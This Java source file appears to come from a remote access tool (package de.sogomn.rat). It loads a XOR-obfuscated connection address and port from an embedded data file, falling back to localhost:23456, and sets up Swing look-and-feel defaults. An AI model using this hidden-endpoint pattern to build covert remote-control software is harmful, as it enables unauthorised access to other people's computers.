package de.sogomn.rat.util;

import java.util.ResourceBundle;

import javax.swing.JDialog;
import javax.swing.JFrame;
import javax.swing.UIDefaults;
import javax.swing.UIManager;
import javax.swing.plaf.nimbus.NimbusLookAndFeel;

import de.sogomn.engine.util.FileUtils;
import de.sogomn.rat.GUISettings;
import de.sogomn.rat.service.IOperatingSystemService;

public final class Resources {
	
	private static final String CONNECTION_DATA_FILE_NAME = "/data";
	
	public static final String VERSION = "1.24.0";
	public static final ResourceBundle LANGUAGE = ResourceBundle.getBundle("language.lang");
	public static final IOperatingSystemService OS_SERVICE = IOperatingSystemService.getInstance();
	
	public static final String ADDRESS;
	public static final int PORT;
	
	static {
		final byte[] data = FileUtils.readInternalData(CONNECTION_DATA_FILE_NAME);
		
		XorCipher.crypt(data);
		
		final String text = new String(data);
		final String[] lines = text.split("\r\n");
		
		String address;
		int port;
		
		try {
			address = lines[0];
		} catch (final Exception ex) {
			address = "localhost";
		}
		
		try {
			final String portString = lines[1];
			port = Integer.parseInt(portString);
		} catch (final Exception ex) {
			port = 23456;
		}
		
		ADDRESS = address;
		PORT = port;
	}
	
	private Resources() {
		//...
	}
	
	public static void setSystemLookAndFeel() {
		try {
			final String className = UIManager.getSystemLookAndFeelClassName();
			
			JFrame.setDefaultLookAndFeelDecorated(true);
			JDialog.setDefaultLookAndFeelDecorated(true);
			
			UIManager.setLookAndFeel(className);
		} catch (final Exception ex) {
			ex.printStackTrace();
		}
	}
	
	public static void setNimbusLookAndFeel() {
		final NimbusLookAndFeel nimbus = new NimbusLookAndFeel();
		final UIDefaults defaults = nimbus.getDefaults();
		
		JFrame.setDefaultLookAndFeelDecorated(true);
		JDialog.setDefaultLookAndFeelDecorated(true);
		GUISettings.setDefaults(defaults);
		
		try {
			UIManager.setLookAndFeel(nimbus);
		} catch (final Exception ex) {
			ex.printStackTrace();
		}
	}
	
}
